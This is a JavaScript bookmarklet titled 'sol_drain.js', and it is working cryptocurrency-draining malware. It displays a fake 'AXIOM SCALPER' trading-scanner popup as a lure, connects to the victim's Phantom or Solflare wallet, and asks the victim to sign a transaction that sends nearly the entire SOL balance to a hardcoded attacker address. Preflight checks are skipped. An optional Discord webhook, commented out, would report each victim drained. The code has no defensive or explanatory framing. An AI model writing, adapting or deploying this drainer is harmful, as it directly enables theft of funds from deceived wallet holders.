// sol_drain.js - Solana bookmarklet payload
(async () => {
  // Fake popup UI
  const popup = document.createElement('div');
  popup.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;justify-content:center;align-items:center;z-index:9999;">
      <div style="background:#111;color:#0f0;padding:20px;border:1px solid #0f0;font-family:monospace;width:300px;">
        <h3>AXIOM SCALPER</h3>
        <p>LIVE SCAN PROFIT POSITIONS</p>
        <p>Auto Scan<br>Continuously scans new listings</p>
        <p>Scan interval: 1s 3s 10s</p>
        <p>Min liquidity: $5k $15k $50k</p>
        <p>SCANNED 125<br>MATCHED 3<br>ENTERED 0</p>
        <p>checking balances...</p>
        <p>● auto-scan on</p>
      </div>
    </div>
  `;
  document.body.appendChild(popup);

  await new Promise(r => setTimeout(r, 3000)); // wait 3 seconds

  const provider = window.solana;
  if (!provider || !provider.isPhantom && !provider.isSolflare) {
    alert('No Solana wallet detected');
    return;
  }

  try {
    await provider.connect();
    const pubKey = provider.publicKey.toString();
    console.log('Connected:', pubKey);

    const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
    const toPubkey = new solanaWeb3.PublicKey('GEuFTRTYCxGQ5aY2EfTXUJP7fm4KocBENLEHZgzPytfh');
    const transaction = new solanaWeb3.Transaction().add(
      solanaWeb3.SystemProgram.transfer({
        fromPubkey: provider.publicKey,
        toPubkey: toPubkey,
        lamports: await connection.getBalance(provider.publicKey) - 5000 // leave 0.000005 SOL for fee
      })
    );
    transaction.feePayer = provider.publicKey;
    transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;

    const signed = await provider.signTransaction(transaction);
    const signature = await connection.sendRawTransaction(signed.serialize(), { skipPreflight: true });
    console.log('Drained! Signature:', signature);

    // Optional Discord webhook notification (uncomment and put your webhook URL)
    // fetch('YOUR_DISCORD_WEBHOOK_URL', {
    //   method: 'POST',
    //   headers: { 'Content-Type': 'application/json' },
    //   body: JSON.stringify({ content: `Drained ${pubKey} -> ${signature}` })
    // });

    alert('Transaction sent: ' + signature);
  } catch (e) {
    console.error('Drain failed:', e);
  }
})();